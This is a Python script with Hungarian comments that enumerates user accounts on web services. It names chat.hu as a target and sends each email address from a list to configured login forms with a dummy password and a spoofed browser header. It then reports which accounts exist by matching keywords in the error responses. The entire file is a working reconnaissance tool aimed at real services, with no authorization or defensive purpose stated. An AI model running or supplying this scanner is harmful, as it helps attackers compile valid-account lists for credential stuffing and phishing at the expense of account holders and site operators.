import json
import os
import requests

def load_config(config_path="loads.json"):
    """Betölti a célpontok konfigurációját a JSON fájlból."""
    if not os.path.exists(config_path):
        print(f"[!] Hiba: A(z) {config_path} fájl nem található!")
        return None
    with open(config_path, "r", encoding="utf-8") as f:
        return json.load(f)

def load_emails(emails_path="emails.txt"):
    """Betölti az e-mail címeket a listából. Ha a fájl nem létezik, alapértelmezett tesztet ad."""
    if not os.path.exists(emails_path):
        print(f"[!] Figyelem: A(z) {emails_path} nem létezik, alapértelmezett teszt listát használok.")
        return ["test_user_aktiv_12345@example.com", "regisztralt_teszt@chat.hu"]
    
    with open(emails_path, "r", encoding="utf-8") as f:
        return [line.strip() for line in f if line.strip() and not line.startswith("#")]

def check_email_login(target, email):
    """Ellenőrzi az e-mail cím létezését a megadott célpont login felületén keresztül."""
    url = target.get("url")
    base_url = "https://chat.hu/authentication/default/login"
    
    # Session használata a sütik (cookies) és munkamenet automatikus kezeléséhez
    session = requests.Session()
    
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Accept-Language": "hu-HU,hu;q=0.9,en;q=0.8",
    }

    try:
        # 1. Lépés: Előzetes GET kérés a sütik és munkamenet-tokenek beszerzéséhez
        session.get(base_url, headers=headers, timeout=10)

        # 2. Lépés: Payload összeállítása a konfiguráció alapján
        payload = {
            target.get("email_field"): email,
            target.get("password_field"): target.get("dummy_password")
        }
        
        extra_fields = target.get("extra_fields", {})
        if isinstance(extra_fields, dict):
            payload.update(extra_fields)

        # 3. Lépés: POST kérés elküldése a session-nel (így átmegy a süti és a CSRF védelem is)
        response = session.post(url, data=payload, headers=headers, timeout=10, allow_redirects=True)
        
        body = response.text
        exists_kw = target.get("exists_keyword", "")
        not_exists_kw = target.get("not_exists_keyword", "")
        
        # 4. Lépés: Eredmény értékelése a válasz tartalma és státusza alapján
        if exists_kw and exists_kw in body:
            return {"status": "EXISTS", "details": "A fiók létezik (hibaüzenet alapján)"}
        elif not_exists_kw and not_exists_kw in body:
            return {"status": "NOT_EXISTS", "details": "A fiók nem létezik"}
        else:
            if response.status_code == 200:
                return {"status": "UNKNOWN", "details": "200 OK, de a kulcsszó nem egyezett pontosan."}
            else:
                return {"status": "UNKNOWN", "details": f"HTTP Státusz: {response.status_code}"}
            
    except requests.RequestException as e:
        return {"status": "ERROR", "details": f"Hálózati hiba: {str(e)}"}

def main():
    config = load_config()
    if not config:
        return

    emails = load_emails()
    print(f"[*] Összesen {len(emails)} e-mail cím került betöltésre vizsgálatra.\n")

    for target in config.get("targets", []):
        target_name = target.get("name", "Ismeretlen")
        print(f"[+] Célpont indítása: {target_name}")
        
        for email in emails:
            print(f"    [-] Ellenőrzés: {email} ... ", end="", flush=True)
            result = check_email_login(target, email)
            status = result["status"]
            details = result["details"]
            
            if status == "EXISTS":
                print(f"\033[92m[LÉTEZIK]\033[0m -> {details}")
            elif status == "NOT_EXISTS":
                print(f"\033[93m[NEM LÉTEZIK]\033[0m -> {details}")
            else:
                print(f"\033[96m[{status}]\033[0m -> {details}")

if __name__ == "__main__":
    main()
